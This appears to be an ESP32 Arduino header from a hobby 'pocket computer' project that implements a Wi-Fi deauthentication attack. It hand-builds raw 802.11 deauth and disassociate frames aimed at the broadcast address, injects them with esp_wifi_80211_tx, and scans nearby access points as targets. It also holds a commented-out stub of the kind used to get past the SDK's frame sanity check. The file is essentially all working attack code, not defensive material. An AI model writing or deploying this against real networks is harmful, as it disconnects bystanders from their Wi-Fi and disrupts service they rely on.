// Credits: DevEclipse1/ESP-Pocket-Puter

#pragma once

#include <Arduino.h>
#include <vector>
#include <WiFi.h>

extern "C" {
#include "esp_wifi.h"
#include "esp_netif.h"
#include "esp_event.h"
  esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
  esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
}

/*
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}*/

uint8_t deauth_frame[26] = {
  /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
  /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

struct APRecord {
  String ssid;
  int32_t rssi;
  uint8_t channel;
  uint8_t bssid[6];
};

std::vector<APRecord> scanForDeauthTargets();

void setupDeauth() {
  esp_netif_init();
  esp_event_loop_create_default();

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);

  esp_wifi_set_mode(WIFI_MODE_STA);
  esp_wifi_start();
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

bool sendDeauthPacket(uint8_t* bssid, uint8_t chan = 1) {
  esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26];
  memcpy(packet, deauth_frame, 26);

  uint8_t ap[6];
  memset(ap, 0xff, sizeof(ap));

  memcpy(&packet[4], ap, 6);
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  packet[24] = 1;
  
  bool status = false;

  if (esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false) == ESP_OK)
  {
      status = true;
  }

  packet[0] = 0xA0;
  if (esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false) == ESP_OK)
  {
      status = true;
  }

  return status;
}

void scanDeauth() {
  wifi_scan_config_t scanConf = {
    .ssid = NULL,
    .bssid = NULL,
    .channel = 0,
    .show_hidden = true
  };

  esp_err_t r = esp_wifi_scan_start(&scanConf, true);
  if (r != ESP_OK) {
    return;
  }

  uint16_t apCount = 0;
  esp_wifi_scan_get_ap_num(&apCount);

  if (apCount == 0) {
    return;
  }

  std::vector<wifi_ap_record_t> apRecords(apCount);
  uint16_t got = apCount;
  esp_err_t err = esp_wifi_scan_get_ap_records(&got, apRecords.data());

  if (err != ESP_OK || got == 0) {
    return;
  }
  apCount = got;

  std::vector<APRecord> myAPs(apCount);

  for (int i = 0; i < apCount; i++) {
    char ssidBuf[33];
    strncpy(ssidBuf, (const char*)apRecords[i].ssid, 32);
    ssidBuf[32] = '\0';

    String ssid = String(ssidBuf);
    if (ssid.length() == 0) {
        ssid = "<Hidden SSID>";
    }

    myAPs[i].ssid = ssid;
    myAPs[i].rssi = apRecords[i].rssi;
    myAPs[i].channel = apRecords[i].primary;
    memcpy(myAPs[i].bssid, apRecords[i].bssid, 6);
  }

  for (auto& ap : myAPs) {
    String ssid = ap.ssid;
    int rssi = ap.rssi;
    uint8_t channel = ap.channel;
    uint8_t bssid[6];
    memcpy(bssid, ap.bssid, 6);
  }
}